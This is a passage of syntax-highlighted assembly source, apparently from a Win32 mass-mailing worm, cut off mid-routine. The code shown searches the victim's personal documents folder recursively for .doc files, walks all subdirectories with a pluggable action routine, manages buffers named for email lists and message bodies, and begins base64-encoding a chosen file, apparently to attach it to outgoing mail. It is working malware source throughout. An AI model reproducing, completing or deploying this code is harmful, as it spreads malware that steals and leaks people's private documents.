      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">MapViewOfFile</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             
      </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileCloseMapHandle</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                             

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileUnmapView</span><span class="sc4">:</span><span class="sc0">  
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">              
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileCloseMapHandle</span><span class="sc4">:</span><span class="sc0"> 
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">               
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileCloseFileHandle</span><span class="sc4">:</span><span class="sc0"> 
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhandle</span><span class="sc4">]</span><span class="sc0">             
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CloseHandle</span><span class="sc0">     
</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;...................... Search Personal Documents ............................</span><span class="sc0">
</span><span class="sc1">;.............................................................................</span><span class="sc0">

</span><span class="sc1">; OUT           - Personal Doc Path in Mem in $ [PersoDocListe]</span><span class="sc0">

</span><span class="sc5">PersonalDocSearch</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">                      </span><span class="sc1">; read/write page</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">PersoFileSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; System decide where </span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">VirtualAlloc</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PersonalDocSearchError</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">PersoDocListe</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">Clear_TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">     
        
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">05h</span><span class="sc0">                     </span><span class="sc1">; Personal Path       </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">SHGetSpecialFolderPathA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">            </span><span class="sc1">; Selected dir = Personal Path</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FindPersonalFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">RoutineToCall</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">AllSubDirSearch</span><span class="sc0">             </span><span class="sc1">; Action = FindPersonalFile</span><span class="sc0">
</span><span class="sc5">PersonalDocSearchError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">   

</span><span class="sc1">;.............. Search Personal File</span><span class="sc0">

</span><span class="sc5">FindPersonalFile</span><span class="sc4">:</span><span class="sc0">       
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbPersonalFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NbPersoWanted</span><span class="sc0">  </span><span class="sc1">; Enought Perso File</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NoMorePersonalFile</span><span class="sc0">
           
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc3">"*.doc"</span><span class="sc0">                        
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">FindFirstFileA</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PersonalSearchHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">NoMorePersonalFile</span><span class="sc0">

</span><span class="sc5">PersonalDocumentFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">PersoDocListe</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbPersonalFound</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; Right Pos</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">            </span><span class="sc1">; The dir</span><span class="sc0">

    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">                 </span><span class="sc1">; The \
</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">search.FileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">lstrcat</span><span class="sc0">                 </span><span class="sc1">; The Name</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbPersonalFound</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Next One</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbPersonalFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NbPersoWanted</span><span class="sc0">  </span><span class="sc1">; Enought Perso File</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EnoughtPerso</span><span class="sc0">

</span><span class="sc5">FindPersonalFileNext</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PersonalSearchHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">FindNextFileA</span><span class="sc0">
    
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">PersonalDocumentFound</span><span class="sc0">

</span><span class="sc5">EnoughtPerso</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PersonalSearchHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">FindClose</span><span class="sc0">

</span><span class="sc5">NoMorePersonalFile</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.............. Search in all Sub Dir + Action in ............................</span><span class="sc0">

</span><span class="sc1">; IN:           - Root dir Selected for the Search begin</span><span class="sc0">
</span><span class="sc1">;           - RoutineToCall = SeekHtmlCurrentDir</span><span class="sc0">
</span><span class="sc1">; OUT:      - What perform RoutineToCall in all subdir of selected Root</span><span class="sc0">


</span><span class="sc5">AllSubDirSearch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             

</span><span class="sc5">FindFirstDir</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">                    
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc3">"*.*"</span><span class="sc0">                        
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">FindFirstFileA</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RecSearchHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     

      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">FirstDirNotFound</span><span class="sc0">

</span><span class="sc5">DirTravel</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">bt</span><span class="sc0">        </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">search.FileAttributes</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">   
      </span><span class="sc6">jnc</span><span class="sc0">       </span><span class="sc5">FindNextDir</span><span class="sc0">                     
                                                
      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">search.FileName</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">                  
      </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">FindNextDir</span><span class="sc0">                   

      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">                                 
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

</span><span class="sc5">InNewDir_Action</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">RoutineToCall</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; THE Action    </span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RecSearchHandle</span><span class="sc4">]</span><span class="sc0">         
    </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">ebx</span><span class="sc0">                             
    </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">FindFirstDir</span><span class="sc0">
</span><span class="sc5">FindNextDir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">                                 
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RecSearchHandle</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">FindNextFileA</span><span class="sc0">

      </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             
      </span><span class="sc6">jnz</span><span class="sc0">       </span><span class="sc5">DirTravel</span><span class="sc0">                           

</span><span class="sc5">FirstDirNotFound</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc3">".."</span><span class="sc0">                                
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">            

    </span><span class="sc6">or</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                             
      </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">AllSubDirSearchEnd</span><span class="sc0">                  
    
    </span><span class="sc6">dec</span><span class="sc0">         </span><span class="sc8">ebx</span><span class="sc0">                                 
    </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RecSearchHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">FindNextDir</span><span class="sc0">

</span><span class="sc5">NextDirNotFound</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RecSearchHandle</span><span class="sc4">]</span><span class="sc0">          
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">FindClose</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">FirstDirNotFound</span><span class="sc0">

</span><span class="sc5">AllSubDirSearchEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.......................... Random Number ....................................</span><span class="sc0">

</span><span class="sc1">; IN:           Edi</span><span class="sc0">
</span><span class="sc1">; OUT:          Random Number in EDX: 0 &lt;-&gt; Edi-1</span><span class="sc0">

</span><span class="sc5">GetRndNumber</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">RandomNb</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">RandomNb</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                      
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">; Reste &lt; Edi in EDX</span><span class="sc0">
               
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;......................... Free The Mem ......................................</span><span class="sc0">

</span><span class="sc5">FreeTheMem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">EmailList</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">       </span><span class="sc5">FreeTheMemNext1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">MemFreeIt</span><span class="sc0">

</span><span class="sc5">FreeTheMemNext1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MemMessageBody1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">       </span><span class="sc5">FreeTheMemNext2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">MemFreeIt</span><span class="sc0">

</span><span class="sc5">FreeTheMemNext2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">PersoDocListe</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">       </span><span class="sc5">FreeTheMemFin</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">MemFreeIt</span><span class="sc0">

</span><span class="sc5">FreeTheMemFin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MemFreeIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">00008000h</span><span class="sc0">                   </span><span class="sc1">; MEM_RELEASE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">VirtualFree</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;..................... Clear TempPath &amp; Name .................................</span><span class="sc0">

</span><span class="sc5">Clear_TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">                   </span><span class="sc1">; Clear the path</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;..................... Encode File Base 64 ...................................</span><span class="sc0">

</span><span class="sc1">; IN:           Path of the file in offset MyPath</span><span class="sc0">
</span><span class="sc1">; OUT:      Encoded file in Mem</span><span class="sc0">

</span><span class="sc5">CodeB64File</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">OpenFileToEncode</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">GENERIC_READ</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">               </span><span class="sc1">; The file to encode</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CreateFileA</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">CodeB64FileEnd</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TempFileHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">GetFileToEncodeSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">GetFileSize</span><span class="sc0"> 
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">CodeB64FileEnd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurSizeToEncode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                   </span><span class="sc1">; Security</span><span class="sc0">

</span><span class="sc5">GetMemToReadFileToEncode</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">                      </span><span class="sc1">; read/write page</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">; System decide where </span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">VirtualAlloc</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CodeB64FileEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MemToEncode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">ReadFileToEncode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ByteReaded</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurSizeToEncode</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TempFileHandle</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">ReadFile</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TempFileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">GetMemToEncodeFile</span><span class="sc4">:</span><span class="sc0">
